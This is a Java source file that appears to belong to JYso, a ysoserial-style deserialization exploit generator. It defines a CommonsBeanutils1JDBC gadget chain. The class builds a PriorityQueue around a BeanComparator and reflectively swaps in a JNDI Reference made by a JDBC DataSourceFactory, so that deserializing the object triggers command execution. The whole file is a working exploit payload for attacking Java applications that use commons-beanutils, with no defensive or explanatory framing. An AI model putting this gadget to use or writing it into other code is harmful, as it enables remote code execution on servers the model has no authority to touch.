package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Reflections;
import org.apache.commons.beanutils.BeanComparator;

import javax.naming.Reference;
import java.math.BigInteger;
import java.util.PriorityQueue;

import static com.qi4l.JYso.gadgets.utils.jdbc.jdbcutils.dbcpByFactory;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({Authors.QI4L})
public class CommonsBeanutils1JDBC implements ObjectPayload<Object> {
    public Object getObject(String command) throws Exception {

        // create a TeraDataSource object, holding  our JDBC string
        //org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory
        //org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory
        //org.apache.commons.dbcp2.BasicDataSourceFactory
        //org.apache.commons.dbcp.BasicDataSourceFactory
        //com.alibaba.druid.pool.DruidDataSourceFactory
        //org.apache.tomcat.jdbc.pool.DataSourceFactory
        Reference ref = dbcpByFactory("org.apache.tomcat.jdbc.pool.DataSourceFactory", command);

        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        // switch method called by comparator to "getConnection"
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = ref;
        queueArray[1] = ref;

        return queue;
    }
}
